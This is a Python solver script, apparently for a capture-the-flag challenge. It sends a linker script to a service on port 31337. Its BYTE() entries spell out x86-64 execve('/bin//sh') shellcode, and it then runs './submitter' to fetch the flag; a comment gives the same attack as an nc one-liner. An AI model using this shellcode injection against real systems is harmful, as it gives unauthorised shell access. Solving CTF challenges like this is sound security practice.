import os
import socket
import time


# (cat solve; sleep 1; echo "./submitter; exit;") | nc 172.17.0.3 31337 | grep Flag


HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, int(PORT)))
    s.sendall(b"""OUTPUT_FORMAT(elf64-x86-64)
ENTRY(_start)
PHDRS
{
  headers PT_PHDR PHDRS ;
  text PT_LOAD FILEHDR PHDRS ;
}
SECTIONS
{
  . = SIZEOF_HEADERS;
  .text :
  {
     _start = 0;
     BYTE(49)
     BYTE(192)
     BYTE(72)
     BYTE(187)
     BYTE(209)
     BYTE(157)
     BYTE(150)
     BYTE(145)
     BYTE(208)
     BYTE(140)
     BYTE(151)
     BYTE(255)
     BYTE(72)
     BYTE(247)
     BYTE(219)
     BYTE(83)
     BYTE(84)
     BYTE(95)
     BYTE(153)
     BYTE(82)
     BYTE(87)
     BYTE(84)
     BYTE(94)
     BYTE(176)
     BYTE(59)
     BYTE(15)
     BYTE(5)
  } :text
}

""")

    time.sleep(1)
    
    s.sendall(b"./submitter; exit;\n")
    
    data = b''
    while True:
        b = s.recv(1)
        if b != b'':
            data += b

        if b == b'}':
            break
    
    lines = data.split(b"\n")
    print(lines[-1].decode().strip())
    



